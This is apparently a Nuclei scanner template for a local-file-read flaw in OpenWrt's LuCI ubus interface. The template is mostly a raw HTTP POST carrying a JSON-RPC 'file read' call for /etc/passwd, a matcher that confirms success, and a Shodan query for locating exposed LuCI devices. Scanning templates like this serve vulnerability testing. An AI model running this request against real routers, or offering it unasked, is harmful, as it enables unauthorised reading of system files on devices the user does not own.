id: openwrt-ubus-lfi

info:
  name: Opentwrt ubus - LFI
  author: qwtd
  severity: high
  reference:
    - https://github.com/wy876/POC/blob/main/OpenWrt/OpenWrt%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
  metadata:
    max-request: 1
    shodan-query: http.title:"OpenWrt - LuCI"
  tags: OpenWrt

http:
  - raw:
      - |
        POST /cgi-bin/luci/admin/ubus?1733734260589 HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 127
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
        Content-Type: application/json
        Accept: */*
        Origin: http://192.168.121.180
        Referer: http://192.168.121.180/cgi-bin/luci/
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: sysauth=305ade5ef36d6ced39e386729e8868b6
        Connection: close

        [{"jsonrpc":"2.0","id":0,"method":"call","params":["305ade5ef36d6ced39e386729e8868b6","file","read",{"path":"/etc/passwd"}]}]

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"

